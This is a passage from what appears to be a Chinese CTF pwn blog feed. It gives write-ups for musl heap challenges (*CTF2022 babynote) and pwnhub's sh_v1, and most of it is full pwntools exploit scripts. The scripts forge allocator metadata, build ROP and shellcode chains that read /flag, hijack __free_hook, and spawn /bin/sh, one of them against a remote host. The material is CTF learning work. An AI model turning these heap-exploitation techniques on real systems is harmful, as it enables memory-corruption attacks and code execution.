class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">set_null, leak</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x73317331</span>).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(set_null).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(leak).encode())<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x238</span> + p32(<span class="hljs-number">5</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">5</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak + <span class="hljs-number">0x2aa0</span><br><br>mmap_addr = libc_base - <span class="hljs-number">0x4000</span><br>stdin = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdin_FILE&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdout_FILE&#x27;</span>]<br>malloc_context = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_context&#x27;</span>]<br>gadget = libc_base + <span class="hljs-number">0x4bcf3</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x15536</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x1b3a9</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x177c7</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>gift(leak - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, malloc_context)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>fake_meta = mmap_addr + <span class="hljs-number">0x1000</span> + <span class="hljs-number">8</span><br>fake_group = mmap_addr + <span class="hljs-number">0x550</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x520</span> + p64(fake_meta)<br>payload = payload.ljust(<span class="hljs-number">0xfd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(secret)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_group)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xfc0</span> + p64(secret) + p64(mmap_addr + <span class="hljs-number">0x1008</span>) * <span class="hljs-number">2</span> + p64(stdout - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">3</span>) + p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>libc.address = libc_base<br>payload = flat([<br>    pop_rdi_ret, mmap_addr + <span class="hljs-number">0x2000</span>,<br>    pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>    pop_rdx_ret, <span class="hljs-number">7</span>,<br>    libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>    mmap_addr + <span class="hljs-number">0x2aa0</span> + <span class="hljs-number">0x40</span><br>])<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, mmap_addr, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>, mmap_addr, <span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>) + p64(mmap_addr + <span class="hljs-number">0x2aa0</span>) + p64(ret) + p64(<span class="hljs-number">0</span>) + p64(gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x800</span>).encode())<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>​</p><p>这里引用另一个师傅的<a href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/">文章</a>关于此题的疑问，自己复现时也有过同样的疑问</p><img src="/img/12/Screenshot 2023-04-04 221257.png" style="zoom: 67%;" /><p>​                                                            </p><p>疑问1：<strong>可以直接申请到stdout_FILE是因为avail_mask设置为2，其表示的是第一个chunk已经被标识为不可分配，第二个chunk则是可以分配，所以就直接越过中间0x940，分配第二个chunk；如果avail_mask设置为3或者1，则就可以正常从头开始分配</strong>。</p><p>疑问2：<strong>是绕过free的检查，更详细点就是get_nominal_size函数中关于chunk边界的检查</strong></p><img src="/img/12/Screenshot 2023-04-04 225810.jpg" style="zoom: 80%;" /><p>​                                                                   </p><h3 id="CTF2022-babynote"><a href="#CTF2022-babynote" class="headerlink" title="*CTF2022 babynote"></a>*CTF2022 babynote</h3><p>这里是参考xyzmpv师傅的<a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">wp</a></p><p>具体细节就不再赘述，需要注意在calloc函数中使用malloc分配内存后会继续调用is_allzero函数，而在is_allzero函数中又存在get_meta函数去检查所分配的内存块，需要先dequeue去将目标内存的group改为正确的内存地址，之后才能正常分配目标地址。</p><p>​                </p><p>利用dequeue去攻击，除了伪造prev,、next、avail_mask、 freed_mask这些值，<strong>freeable和maplen也不能忽视</strong>。</p><p>只有freeable &#x3D; 1时，meta才能被dequeue。</p><p>当maplen &#x3D; 0时，说明group不是新mmap 出来的，而是使用其他meta里的group；使用最简单的代码就能证明这一点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>在malloc(0x20)之前是没有相应0x30大小的group</p><img src="/img/12/Screenshot 2023-04-05 120207.png" style="zoom: 67%;" /><p>​</p><p>在malloc后可以观察到active[2]的group实际上是直接从active[15]中分配的chunk</p><img src="/img/12/Screenshot 2023-04-05 120251.jpg" style="zoom:67%;" /><p>而在利用dequeue去攻击时，如果设置maplen为0，在dequeue之后就会调用free_group函数，然后就使用get_meta对伪造的group还要做一系列检查，最后再去调用nontrivial_free函数，这就对伪造的group和meta有更多的要求，引起不必要的麻烦。</p><img src="/img/12/Screenshot 2023-04-04 232505.jpg" style="zoom: 80%;" /><p>​</p><p>由于自己本地使用的是musl_1.2.2-4，对这道题给的libc无法正常使用带符号调试(也不确定是不是这个原因导致的)，为了方便自己做题就直接拿本地的libc去做了，下面exp仅供参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babynote&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babynote&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size0, content0, size1, content1</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size0).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content0)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size1).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content1)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><br><span class="hljs-comment">#由于本地的group没有在libc附近的，所以事先分配大量的chunk，让group分配到libc附近</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;aaaaaaaa\n&#x27;</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;d\n&#x27;</span>)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br><br>elf_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    elf_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>elf_base -= <span class="hljs-number">0x7d10</span><br>libc_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    libc_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>libc_base += <span class="hljs-number">0x1d90</span><br>stdin = libc_base + <span class="hljs-number">0xad180</span><br>stdout = stdin + <span class="hljs-number">0x100</span><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_context = libc_base + <span class="hljs-number">0xad9c0</span><br><span class="hljs-comment"># print(hex(elf_base))</span><br><span class="hljs-comment"># print(hex(libc_base))</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x4fc0</span>) + p64(malloc_context) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>find(<span class="hljs-number">0x20</span>, payload)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br>secret = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    secret += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br><br>heap_addr = libc_base - <span class="hljs-number">0x6000</span><br>fake_meta = heap_addr + <span class="hljs-number">0x1008</span><br>fake_group = heap_addr + <span class="hljs-number">0x1040</span><br><br><span class="hljs-comment">#这里是伪造meta，然后先让其queue</span><br>last_idx, freeable, sc, maplen = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x40</span>) <br>payload += p64(secret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_group) + p64(<span class="hljs-number">0</span>) <br>payload += p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x5fc0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#伪造的另一个meta,在dequeue后让其成为链表头，以后直接分配目标地址</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x580</span>) + p64(secret) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(stdin - <span class="hljs-number">0x10</span>)<br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">3</span>) + p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;g&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br><span class="hljs-comment">#利用先前伪造的meta已经queue,再去修改prev和next，然后利用dequeue攻击</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x50</span>) <br>payload += p64(secret) + p64(stdin - <span class="hljs-number">0x18</span>) + p64(heap_addr + <span class="hljs-number">0x2008</span>) + p64(fake_group) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)|(sc &lt;&lt; <span class="hljs-number">6</span>)| (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>) | <span class="hljs-number">1</span>) + p64(fake_group - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>find(<span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x6fb0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;h&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br><br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">1</span>)  + p64(<span class="hljs-number">0</span>) + p64(sys_addr)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>参考：<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">https://blog.csdn.net/weixin_45209963/article/details/124423573</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub3月公开赛&amp;&amp;内部赛</title>
    <link href="/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/"/>
    <url>/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="sh-v1"><a href="#sh-v1" class="headerlink" title="sh_v1"></a>sh_v1</h1><p>漏洞在命令 <strong>ln</strong> 中，它会直接对堆地址复制，造成uaf。</p><p>解题思路：</p><ul><li>利用uaf，使用gedit修改已经释放的chunk中的key，然后double free。</li><li>修改tcache的next指针，使其指向tcache的头，修改0x290的数量为7，释放它就可以得到unsorted bin，进一步泄漏libc地址。</li><li>继续编辑tcache的头，修改0x210的数量为7，并在相应的位置写入__free_hook。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sh_v1.1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/x/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process(&#x27;./sh_v1.1&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">34883</span>) <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&gt;&#x27;</span>, content)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag flag1&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;ln flag flag2&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;gedit flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;cat flag2&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(p64(heap_addr - <span class="hljs-number">0x290</span>))<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag3&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag3 flag4&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag3&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;cat flag4&#x27;</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_addr))<br>malloc_hook = leak_addr - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span 